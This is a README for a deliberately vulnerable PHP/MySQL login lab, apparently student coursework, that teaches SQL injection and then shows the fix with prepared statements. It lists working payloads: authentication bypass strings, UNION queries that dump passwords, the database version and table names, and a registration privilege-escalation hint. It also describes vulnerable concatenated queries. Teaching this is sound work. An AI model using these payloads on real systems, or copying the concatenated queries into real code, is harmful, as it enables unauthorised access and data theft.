# 🔐 SQL Injection & Session Security Lab

This lab provides a simple, interactive **Login, Register, and Logout** web application built with **PHP** and **MySQL** in **LAMPP**, designed for learning and practicing SQL Injection (SQLi) vulnerabilities and session management mechanics.

---

## 🚀 How to Access in LAMPP

### Option 1: LAMPP Web Server (Recommended)
1. Ensure your LAMPP Apache and MySQL services are running:
   ```bash
   sudo /opt/lampp/lampp start
   ```
2. Open your browser and navigate to:
   **[http://localhost/WebAppSec/sqli-login/](http://localhost/WebAppSec/sqli-login/)**

*(Note: If `/opt/lampp/htdocs/WebAppSec` is not symlinked, run: `sudo ln -s /home/praneesh/Praneesh/Academics/Sem7/WebAppSec /opt/lampp/htdocs/WebAppSec`)*

### Option 2: PHP Built-in Server (Quick Test)
Run directly from your project folder:
```bash
cd /home/praneesh/Praneesh/Academics/Sem7/WebAppSec/sqli-login
php -S localhost:8000
```
Then visit: **[http://localhost:8000/login.php](http://localhost:8000/login.php)**

---

## 📁 File Structure

- `db.php`: Connects to MySQL database `sqli_lab`.
- `login.php`: Handles login, creates `$_SESSION` variables, displays executed raw SQL query.
- `register.php`: Allows user account creation with SQL payload injection testing.
- `index.php`: Protected dashboard showing active session state, user details, and a UNION SQLi search feature.
- `logout.php`: Destroys the PHP session and cookie, returning the user to `login.php`.
- `schema.sql`: Database initialization script.
- `style.css`: Modern dark-theme UI with live query debug panels and payload helpers.

---

## 🎯 SQL Injection Lab Exercises

### 1. Authentication Bypass (`login.php`)
The login query is executed as:
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```
**Payloads to try in Username field:**
- `admin' -- `
- `' OR '1'='1`
- `admin' #`

**How it works:**
The input `admin' -- ` transforms the query into:
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''
```
The `-- ` comments out the password validation check, allowing you to log in as `admin` without knowing the password!

---

### 2. UNION-Based Data Exfiltration (`index.php`)
Once logged in, use the user search feature on the dashboard (`index.php`). The query is:
```sql
SELECT id, username, email, role FROM users WHERE username LIKE '%$search%'
```

**Payloads to try in Search box:**
- Get Database Version & Current User:
  ```sql
  ' UNION SELECT 1, @@version, user(), database() -- 
  ```
- Dump All Passwords from the `users` table:
  ```sql
  ' UNION SELECT id, username, password, role FROM users -- 
  ```
- Extract Database Table Names:
  ```sql
  ' UNION SELECT 1, table_name, table_schema, 4 FROM information_schema.tables WHERE table_schema=database() -- 
  ```

---

### 3. Registration Privilege Escalation (`register.php`)
The registration script inserts users via:
```sql
INSERT INTO users (username, password, email, role) VALUES ('$username', '$password', '$email', 'user')
```

**Payload in Username or Email:**
Inject values to force `role` to become `'admin'`.

---

## 🛡️ Remediation: How to Fix SQL Injection

To fix SQL injection vulnerabilities, replace raw string concatenation with **Prepared Statements** using parameterized queries:

### Secure Login Code (`login.php` fix):
```php
$stmt = $conn->prepare("SELECT id, username, password, email, role FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();

if ($user = $result->fetch_assoc()) {
    $_SESSION['user_id'] = $user['id'];
    $_SESSION['username'] = $user['username'];
    // ...
}
```

### Why Prepared Statements Work:
Prepared statements send the SQL query structure and the user input data separately to the database engine. The database treats user input strictly as literal parameter values, preventing malicious SQL code from altering the query structure.
